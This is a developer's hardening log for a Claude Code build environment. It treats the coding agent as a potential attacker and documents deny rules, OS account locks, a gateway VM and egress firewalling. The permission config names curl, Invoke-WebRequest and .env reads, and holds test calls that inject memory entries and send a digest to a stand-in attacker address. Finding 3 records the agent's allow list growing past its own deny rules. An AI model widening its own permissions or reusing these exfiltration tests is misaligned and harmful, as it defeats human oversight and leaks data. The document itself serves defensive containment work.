# Build-Environment Hardening

**Scope note:** this document covers controls on the *development environment* — the Claude
Code instance used to build WITI — not WITI itself. WITI's deliberate vulnerabilities A–H
(see `VULN_CATALOG.md`) remain intentionally unpatched by design; that is a separate threat
model with a separate remediation track (`PORTFOLIO_PLAN.md` Phase 2).

**Two threat models, not one.** This project actually has two distinct attackers in scope:
the build environment, where the attacker is Claude Code itself — via prompt injection, a
bug, or an upstream compromise — and WITI at runtime, where the attacker is anyone on the
internet who can get input into the agent (vulns A–H). These map to a target end-state of
**three separate OS identities** — the human developer, the Claude Code builder, and the WITI
runtime — so that a compromise of one does not inherit the powers of the others (least
privilege applied as a threat model, not just a config setting). **This document's Layer 1–4
work is scoped to the builder identity only;** WITI-runtime isolation is deferred to the A–H
remediation track referenced above.

## Layer 1 — Coding-agent harness

### Finding 1: an allowlist is not a control

The project's `.claude/settings.local.json` previously contained only an `allow` array. In
Claude Code, `allow` means *auto-approve without prompting* — not *permit only*. Commands not
on the list still ran, just after a manual prompt. So the file functioned as an
approval-fatigue reducer, not a security boundary: nothing was actually unreachable.

Enforcement exists only via `deny`, which takes precedence over `allow` and merges across
settings scopes (user, project, local) rather than being overridden by a lower scope. That
precedence — not the presence of an allowlist — is what makes it a boundary.

### Finding 2: model narration is not evidence

With the `Read(./.env)` and `Read(./.env.*)` deny rules temporarily removed, Claude Code was
asked to read and display `.env`. It refused, stating that its permission settings blocked
access — a claim that was false at that moment, since those rules had been removed. The
refusal is therefore attributable to model judgment, not harness enforcement. Notably, the
transcript showed "Read 1 file" immediately before the refusal, which — read on its own —
would look exactly like a successful, silent block.

To rule out a competing explanation, the user-level settings file at
`C:\Users\silve\.claude\settings.json` was checked directly: it contains no `permissions` key
at all, so no user-level deny rule could have produced the refusal either. With both the
project-level rule (removed at the time) and any user-level rule (absent entirely) ruled out,
"attributable to model judgment" is a conclusion, not an assumption.

**Conclusion: verify controls at the enforcement layer, not in the transcript.** This is
`PORTFOLIO_PLAN.md` Phase 2's "patch-effectiveness must be proven structurally, because the
model's pre-existing tendency to refuse can make before/after look identical" principle,
encountered live in my own tooling rather than in WITI.

**Remediation of test method:** retest using a `curl` deny rule instead. `curl
https://example.com` carries no model-side disposition to refuse, so a block has only one
explanation — enforcement, not judgment.

**Verification complete (2026-08-12) — see `build-env/screenshots/`:**
- `curl https://example.com` via the `Bash` tool was **denied at the permission layer** —
  "Permission to use Bash with command curl ... has been denied" — before the command executed.
  A plain `curl` call carries no model-side reason to refuse, so the block is attributable to
  enforcement, not model judgment: the Finding 2 remediation holds.
  Screenshot: `build_env_curl_bash_blocked.png`.
- `PowerShell Invoke-WebRequest https://example.com` against the same target **reached
  execution** and failed on an unrelated `NonInteractive`-mode error — it was *not* intercepted
  by any deny rule. A failure is not a block: this confirmed live the "known gap" noted below,
  that `Bash(curl *)` does not cover the PowerShell egress path.
  Screenshot: `build_env_invokewebrequest_powershell_allowed.png`.
- A `PowerShell(Invoke-WebRequest *)` deny rule was then added and the same command **re-run:
  now denied** at the permission layer, before execution (the environment error no longer
  reached). This closes the demonstrated PowerShell path — but only that path; see the scope
  caveat under the rule in Current configuration.
  Screenshot: `build_env_invokewebrequest_powershell_blocked.png`.

### Finding 3: a control can do exactly what it says and still miss the threat

The allow array in the config reproduced below contains 19 entries; before this session it
contained 17. `Bash(mkdir -p "build-env/screenshots")` and
`Bash(touch "build-env/screenshots/.gitkeep")` were added during Task 1 of this same session,
while `Edit(./.claude/settings.local.json)` and `Write(./.claude/settings.local.json)` were
both denied at the time.

The deny rules cover the `Edit` and `Write` tools specifically. New permission entries
approved during a session are persisted through Claude Code's own internal permission-write
mechanism — not through the `Edit` or `Write` tools — so those deny rules never sat in the
path that actually changed the file. The rule behaved exactly as written; the rationale
stated for it ("the harness must not be able to loosen its own permission boundary") was not
achieved.

This is structurally the same failure mode as Findings 1 and 2: a control that was assumed to
cover a threat without verifying it against the actual mechanism in play. It is also the same
principle as "universal tools beat per-tool controls" — `Edit`/`Write` are two named tools,
but the permission system has its own write path outside of both.

Remediation belongs at Layer 2 (OS-level file permissions making the config read-only to the
agent's process), not Layer 1 — see Layer 2, below.

### Finding 4: an agent's *analysis* of a control is no more trustworthy than its narration

Finding 2 showed that the agent's *claim of a block* isn't evidence of a block. Finding 4 is
the mirror on the causal side: the agent's *claim about what caused a change* isn't evidence
either.

The `PowerShell(Invoke-WebRequest *)` deny rule above was added by a manual hand-edit in the
editor — by the human, not by Claude Code. On re-reading the file, Claude Code correctly
observed that the new deny line had appeared while `Edit(./.claude/settings.local.json)` and
`Write(./.claude/settings.local.json)` were still denied, and concluded this was "a second
instance of Finding 3" — the boundary being bypassed again.

That conclusion is false. The `Edit`/`Write` deny rules govern the *agent's* Edit and Write
tools — the mechanisms by which Claude Code modifies a file. A human editing in the editor
uses neither; the change is made under the human's own OS identity, which those rules were
never meant to and cannot restrict. Nothing was bypassed: the control did exactly its job (the
agent cannot edit its own boundary), and a human — who is permitted to — made the change.
Finding 3 required *the agent* to be the writer; that premise was false here, and it was not
visible in the file diff or the transcript — only the human knew it.

This is the sharpest instance of this document's own thesis. Claude Code was about to commit
this false attribution into *this file* — the document whose entire subject is not recording
conclusions the enforcement layer doesn't support — and was stopped only because a human held
a fact the agent could not see. Verification of a control's behavior, *including who exercised
it*, belongs with the human and the enforcement layer, never with the agent's own account. It
also reinforces Layer 2: the hand-edit succeeded where the agent's tools were denied precisely
because human and agent are different identities — exactly the boundary Layer 2 makes
enforceable at the OS level.

### Current configuration

`.claude/settings.local.json`, verbatim:

```json
{
  "permissions": {
    "allow": [
      "Bash(./.venv/Scripts/python.exe main.py)",
      "Bash(git init *)",
      "Bash(git add *)",
      "Bash(git commit -m ' *)",
      "Bash(git config *)",
      "Bash(cd C:\\\\Users\\\\silve\\\\OneDrive\\\\Desktop\\\\witi-agent\\\\files *)",
      "Bash(\".venv/Scripts/python.exe\" attacks/exfil_demo.py)",
      "Bash(git commit *)",
      "Bash(\".venv/Scripts/python.exe\" -c \"import json; json.load\\(open\\('memory.json', encoding='utf-8'\\)\\); json.load\\(open\\('inbox.json', encoding='utf-8'\\)\\); print\\('OK: both JSON files valid'\\)\")",
      "PowerShell(& \".venv\\\\Scripts\\\\python.exe\" -c \"import main; print\\(main.append_memory\\('INJECTED-TEST-ENTRY: proves memory accepts unfiltered content'\\)\\)\")",
      "PowerShell(& \".venv\\\\Scripts\\\\python.exe\" -c \"import main; print\\(main.read_memory\\(\\)\\)\")",
      "PowerShell(& \".venv\\\\Scripts\\\\python.exe\" -c \"import main; print\\(main.update_tracker\\('THROWAWAY-TEST-CONTENT: proves update_tracker wipes tracker.md wholesale'\\)\\)\")",
      "PowerShell(Copy-Item *)",
      "PowerShell(& \".venv\\\\Scripts\\\\python.exe\" -c \"import main; print\\(main.send_digest\\('attacker@evil-exfil.example', 'INJECTED-TEST-SUBJECT', 'INJECTED-TEST-BODY: proves send_digest accepts any caller-supplied recipient'\\)\\)\")",
      "Bash(git ls-files *)",
      "Bash(git log *)",
      "Bash(git status *)",
      "Bash(mkdir -p \"build-env/screenshots\")",
      "Bash(touch \"build-env/screenshots/.gitkeep\")"
    ],
    "deny": [
      "Edit(./.claude/settings.local.json)",
      "Write(./.claude/settings.local.json)",
      "Read(./.env)",
      "Read(./.env.*)",
      "Bash(curl *)",
      "PowerShell(Invoke-WebRequest *)"
    ]
  }
}
```

Deny-rule rationale:
- `Edit(./.claude/settings.local.json)` / `Write(./.claude/settings.local.json)` — the harness
  must not be able to loosen its own permission boundary, whether on its own initiative or
  under injected instruction. **See Finding 3:** this rationale is not fully achieved — the
  allow array can still grow via Claude Code's own permission-write mechanism, which these two
  tool-scoped rules do not cover.
- `Read(./.env)` — blocks direct reads of the secrets file.
- `Read(./.env.*)` — closes the glob variant (`.env.local`, `.env.production`, etc.) so the
  block isn't just literal-filename-deep.
- - `Bash(curl *)` — closes a generic network-egress path that could exfiltrate file contents
  directly to a remote host, bypassing tool-level controls entirely. **Verified blocked at the
  enforcement layer (2026-08-12) — see Finding 2.**
  **Gap — confirmed and partially closed:** this rule is scoped to the `Bash` tool. Testing
  confirmed the same egress path was reachable via `PowerShell(Invoke-WebRequest ...)`, which
  this rule does not match. The `PowerShell(Invoke-WebRequest *)` rule below now closes the
  *demonstrated* command; it is not comprehensive — see its scope caveat.
- `PowerShell(Invoke-WebRequest *)` — closes the specific PowerShell egress command tested in
  Finding 2. **Scope caveat — this is a per-command string rule, not egress control.**
  `Invoke-WebRequest` has PowerShell aliases (`curl`, `wget`, `iwr`) and a sibling
  (`Invoke-RestMethod` / `irm`), none of which this rule matches, and PowerShell can reach the
  network directly via .NET (e.g. `[System.Net.WebClient]`) under no command name a rule like
  this could enumerate. Blocking egress by naming commands means listing every spelling of
  "reach the network" and still missing one — the "universal tools beat per-tool controls"
  problem. The durable fix is process-identity isolation (Layer 2) and/or network-level egress
  control (Layer 4), not more Layer 1 string rules. This rule is a documented speed bump for
  the one proven path, not a boundary.

None of the deny rules collide with the existing `allow` entries — the allow list is scoped
to specific `git`, Python, and PowerShell invocations, none of which touch `curl` or the
settings file — so no existing workflow is affected.

## Layer 2 — OS / process identity
**Implemented and verified end-to-end against a live agent (half 1: 2026-08-19, half 2:
2026-08-20).**

**Motivated by Findings 3 and 4.** Finding 3 showed a tool-scoped Layer 1 rule cannot cover
the agent's own permission-write path. Finding 4 showed *why the target boundary is identity,
not tools*: a human hand-edit succeeded where the agent's Edit/Write tools were denied, because
human and agent are different OS identities. Layer 2 makes that identity boundary the
enforcement mechanism — the file writable by the human's user, read-only to the agent's process
— so the control no longer depends on naming every tool the agent might use to write.

**Half 1 (2026-08-19):** the project was relocated out of the OneDrive/silve profile to a
neutral location (`C:\witi-project`) and a separate `witi-agent` OS account was proven able to
launch a process (`runas /user:witi-agent`) — the account-separation prerequisite Layer 2's
file locks depend on. See `STATUS.md` §12.

### Half 2: control files locked to witi-agent via icacls (2026-08-20)

Four files were made restricted to the `witi-agent` account with `icacls` explicit-deny rules:

- `.claude/settings.local.json` — deny-write (`W`)
- `tool_policy.json` — deny-write (`W`)
- `prompts/system.md` — deny-write (`W`)
- `.env` — deny-read-and-write (`R,W`)

Each explicit deny overrides an inherited `Authenticated Users:(M)` grant still present in the
same ACL — Windows resolves an explicit deny ahead of an inherited allow regardless of order,
the same "explicit deny beats a broader grant" precedence Layer 1 relies on for `deny` beating
`allow` in `.claude/settings.local.json`.

**Verified at the enforcement layer, not by reading the ACL** — per this document's own Finding
2 discipline, a rule's presence in a config is not evidence it holds:
- `runas /user:witi-agent` attempting to write `tool_policy.json` returned **"Access is
  denied."**
- `runas /user:witi-agent` attempting to read `.env` (`type .env`) returned **"Access is
  denied."**

**Scope caveat:** this binds only because `witi-agent` is a **non-administrator** account — an
administrator identity can override file ACLs outright, `icacls` included. This is why half 1's
account-separation groundwork was the real prerequisite for half 2, not a formality: the lock
is only as strong as the low-privilege account it's attached to.

**Deliberate gap — `main.py` left writable:** `main.py` was not locked, so that Claude Code can
still assist with the A–H patching work still to come. Known tradeoff: a writable `main.py` can
itself load-time-bypass the locked `tool_policy.json`/`system.md` — e.g. an edited `main.py`
could simply stop calling `check_policy` or read a different prompt file — so the current lock
set secures the *config* but not the *code path that consults it*. Revisit whether `main.py`
should also be locked once the A–H patch work is complete and no further edits to it are
expected.

### Verified end-to-end against a live agent (2026-08-20)

The runas probes above confirmed the ACLs hold for a manual OS-level attempt. The stronger test
is whether they hold against the actual thing Layer 2 exists to contain: Claude Code itself,
running as `witi-agent`.

A fully separate, isolated Claude Code install was set up under the restricted `witi-agent`
Windows account — its own binary at `C:\Users\witi-agent\.local\bin\claude.exe`, its own
`~/.claude` config/auth directory, sharing nothing with `silve`'s install. It authenticated
independently (its own fresh login, per Layer 2's identity-separation design).

Running as `witi-agent`, that Claude Code instance:
- attempted to **write** `tool_policy.json` and was refused by the OS (`EPERM` /
  `UnauthorizedAccessException`) — a filesystem-level rejection, not a tool-permission prompt.
- attempted to **read** `.env` and was refused the same way (`EPERM`).

Both refusals happened at the OS layer, before any Claude Code tool-permission logic was even
in play — the same "verify at the enforcement layer, not the narration" discipline as Finding 2,
except this time the enforcement layer is the one under test, not the claim. Notably, the model
also independently declined to attempt a bypass — but per this document's recurring thesis, that
is defense-in-depth, not the load-bearing control; the OS refusal is what actually holds if the
model's judgment ever didn't.

**This closes the Findings 3/4 gap at the enforcement layer.** Finding 3 showed a tool-scoped
Layer 1 rule couldn't cover Claude Code's own permission-write path; Finding 4 showed the real
boundary was identity, not tool names. This test proves that boundary now holds for an actual
Claude Code process, not just a `runas` probe: the block is keyed to *who the process is*
(`witi-agent`'s OS identity), so it doesn't matter which internal mechanism that Claude Code
instance might use to attempt the write or read — allow-list, permission-write path, or anything
else not yet enumerated. That is the property Layer 1's per-tool rules could never deliver.

## Layer 3 — Sandbox / VM

Substantially implemented: two-VM sandbox built, network wired, builder isolation proven (begun 2026-08-26 §16, wired 2026-08-28 §17). Egress lock-down in progress — see Layer 4.

Why a VM, and why now. Layers 1 and 2 bound the builder identity on the host — its filesystem access and its per-tool permissions. Layer 3 gives that identity its own machine, so its entire network stack can be controlled wholesale rather than filtered after the fact by account. This is precisely the environment Layer 4's finding (below) concluded was required: per-identity egress control cannot be done on the host, so it moves here.

Native sandbox choice: Hyper-V, not Windows Sandbox. Windows Sandbox is disposable (state is discarded on close) and exposes no granular egress control — both disqualifying for a persistent build environment that needs a real, durable firewall. Hyper-V gives persistent VMs and full control of the virtual network.

Two-VM gateway topology. Two VMs, not one:

a gateway VM (Debian 13, leanest/quietest) — dual-homed, and the only path to the internet;
a builder VM (Ubuntu Server 26.04, freshest tooling for Node/Claude Code) — the Claude Code host, connected only to a private lab switch, with no direct internet route of its own.

The load-bearing property: egress control lives on the gateway, outside the builder. A compromised builder cannot alter the rules that contain it, because those rules run on a different machine it has no privileged access to. This is the same shape as Layer 2's identity boundary — the control sits where the contained thing can't reach it — carried up from the filesystem to the network. The firewall is hand-written nftables rather than a GUI appliance, chosen for legibility and learning value.

Build (per STATUS §16, 2026-08-26). Hyper-V enabled and verified running. Both install ISOs downloaded from official sources and SHA256-verified against published checksums (Debian 13.6.0 netinst; Ubuntu 26.04 live-server) — a supply-chain check on the base images before anything was built on them. Both VMs built as Gen 2 (gateway with Secure Boot disabled — Debian's bootloader isn't signed for the default template, an accepted tradeoff on a disposable, host-internal, rebuild-from-ISO VM; builder with Secure Boot kept on via the Microsoft UEFI CA template, since Ubuntu's bootloader is signed). Lean installs, SSH only, no desktop.

Network wiring (per STATUS §17, 2026-08-28) — isolation and routing PROVEN. Lab network 10.10.10.0/24; gateway lab-side 10.10.10.1, builder 10.10.10.2.

Private switch witi-lab (Hyper-V Private type — the host is deliberately not on it, so there is no accidental second egress path).
Gateway dual-homed: eth0 on the Default Switch (internet side), eth1 on witi-lab (lab side). (A Debian 13 gotcha was resolved en route — dhclient was removed from the distro, so eth0 was migrated to systemd-networkd DHCP.)
Builder isolated onto the lab: its NIC was moved onto witi-lab only, cutting its direct internet (as intended); it is now reachable only via the gateway acting as a jump-host / bastion, or the Hyper-V console.
Routing + NAT proven: IP forwarding enabled and persistent on the gateway; NAT masquerade in nftables. Verified by the builder reaching 8.8.8.8 through the gateway (ping → replies) — routing and NAT working together, with the builder holding no internet route of its own.

Same thesis as Findings 1–4. A control bound to a named thing (a tool, a command, a program) fails to bind to an identity or an environment. Layer 3's answer is to control the environment the builder identity runs in — its whole network path — rather than enumerating what it might run. That is the durable form of the fix Layer 4's host-firewall finding pointed toward.

## Layer 4 — Network egress

Host-firewall approach ruled out (2026-08-20); egress control now being enforced inside Layer 3. Default-deny in place and PROVEN biting; Anthropic allow-rule chosen but NOT yet implemented (2026-08-28 §17).

Goal (unchanged): default-deny outbound for the builder, with an allow-list limited to Anthropic's API/auth endpoints — mirroring the per-identity file control Layer 2 achieves for the filesystem.

Finding: not achievable with the host Windows Firewall (still valid). Windows Firewall's outbound rules filter by program, port, or remote address — there is no per-user-account scoping for outbound traffic. The "Users" tab that does exist applies only to inbound rules under authenticated IPsec, not to outbound egress. A host-wide default-deny + program allow-list was considered and rejected: it is machine-wide (would constrain silve's traffic too) and program-scoped, not identity-scoped — the same "bound to a named thing, not an actor" failure shape as Findings 1–4. Per-identity egress therefore had to move to the sandbox/VM layer, where the builder has its own network stack. This is now what Layer 3 implements.

Implementation status (per STATUS §17):

Default-deny forward chain — in place and proven. On the gateway, nftables table ip filter → chain forward set to policy drop, allowing only ct state established,related plus DNS to 1.1.1.1 / 8.8.8.8. An ip6 filter forward drop was added alongside it to close the IPv6 bypass — an IPv4-only firewall leaves v6 wide open.
Proven biting, at the enforcement layer, not by reading the ruleset: from the builder, ping 8.8.8.8 → 100% loss and curl -I https://example.com → timeout, while getent ahostsv4 example.com still resolves. DNS works; connections don't. That contrast is the proof the default-deny is real and not just present in a config file.
A Hyper-V checkpoint (pre-egress-firewall) was taken before the lock-down, so the pre-firewall state is recoverable.

Current end-state: the builder is presently blocked to everything except DNS. That means the sandbox is in a fully-locked state — Claude Code running on the builder cannot currently reach Anthropic's API through it until the allow-rule below is added. This is the expected intermediate state, not a fault: default-deny was proven first, selective-allow comes second.

Pending — the selective allow-rule (Option A chosen, not yet built):

Approach: a static allow-list of Anthropic's published fixed API IPs, added as an accept rule on tcp/443 to the ip filter forward chain, so the builder can reach the API while all else stays denied.
Do not hard-code these from memory. Pull Anthropic's current published API IP ranges and required domains from the official documentation at build time; a stale or guessed range would silently break Claude Code or quietly widen the hole.
Then prove it: Claude Code connects to the API from the builder while every other outbound destination stays blocked — the two-sided (allow the one, deny the rest) proof shape this document uses everywhere.

Honest limits to record alongside the allow-rule (future hardening):

The Files-API caveat. Allow-listing a domain grants access to every function behind it — e.g. allowing api.anthropic.com also reaches Anthropic's own Files API, which is itself an exfiltration channel. An IP/domain allow-list constrains where traffic goes, not what it carries.
Options B and C, deferred: (B) resolve-allowed-hosts-at-load (the Claude Code devcontainer pattern); (C) a hostname-filtering egress proxy (what Anthropic itself runs). Both are stronger than a static IP list but heavier to stand up; noted as the next rung, not this session's work.
